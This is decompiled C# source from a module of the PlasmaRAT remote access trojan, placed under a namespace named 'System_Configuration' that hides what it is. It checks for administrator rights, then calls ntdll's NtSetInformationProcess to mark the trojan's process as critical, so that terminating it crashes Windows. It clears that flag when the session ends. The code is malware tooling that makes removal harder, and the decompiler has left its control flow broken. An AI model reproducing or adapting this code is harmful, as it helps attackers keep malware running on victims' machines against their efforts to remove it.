using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace System_Configuration
{
	// Token: 0x02000020 RID: 32
	[StandardModule]
	internal sealed class SetProcCritical
	{
		// Token: 0x060000CF RID: 207 RVA: 0x0000BFFC File Offset: 0x0000A1FC
		public static void CriticalProcess()
		{
			int num;
			int num5;
			object obj;
			try
			{
				IL_00:
				ProjectData.ClearProjectError();
				num = 1;
				IL_07:
				int num2 = 2;
				if (!AntiEverything.IsAdmin())
				{
					goto IL_3C;
				}
				IL_10:
				num2 = 3;
				SystemEvents.SessionEnding += delegate(object sender, SessionEndingEventArgs e)
				{
					SetProcCritical.NonCriticalProcess();
				};
				IL_23:
				num2 = 4;
				IntPtr handle = Process.GetCurrentProcess().Handle;
				int processInformationClass = 29;
				int num3 = 1;
				SetProcCritical.NtSetInformationProcess(handle, processInformationClass, ref num3, 4);
				IL_3C:
				goto IL_A3;
				IL_3E:
				int num4 = num5 + 1;
				num5 = 0;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num4);
				IL_64:
				goto IL_98;
				IL_66:
				num5 = num2;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
				IL_76:;
			}
			catch when (endfilter(obj is Exception & num != 0 & num5 == 0))
			{
				Exception ex = (Exception)obj2;
				goto IL_66;
			}
			IL_98:
			throw ProjectData.CreateProjectError(-2146828237);
			IL_A3:
			if (num5 != 0)
			{
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x060000D0 RID: 208 RVA: 0x0000C0C4 File Offset: 0x0000A2C4
		public static void NonCriticalProcess()
		{
			int num;
			int num5;
			object obj;
			try
			{
				IL_00:
				ProjectData.ClearProjectError();
				num = 1;
				IL_07:
				int num2 = 2;
				if (!PlasmaRAT.WhatToRun.Contains("c"))
				{
					goto IL_3C;
				}
				IL_1A:
				num2 = 3;
				if (!AntiEverything.IsAdmin())
				{
					goto IL_3C;
				}
				IL_23:
				num2 = 4;
				IntPtr handle = Process.GetCurrentProcess().Handle;
				int processInformationClass = 29;
				int num3 = 0;
				SetProcCritical.NtSetInformationProcess(handle, processInformationClass, ref num3, 4);
				IL_3C:
				goto IL_A7;
				IL_3E:
				int num4 = num5 + 1;
				num5 = 0;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num4);
				IL_68:
				goto IL_9C;
				IL_6A:
				num5 = num2;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
				IL_7A:;
			}
			catch when (endfilter(obj is Exception & num != 0 & num5 == 0))
			{
				Exception ex = (Exception)obj2;
				goto IL_6A;
			}
			IL_9C:
			throw ProjectData.CreateProjectError(-2146828237);
			IL_A7:
			if (num5 != 0)
			{
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x060000D1 RID: 209
		[DllImport("ntdll.dll", SetLastError = true)]
		private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
	}
}
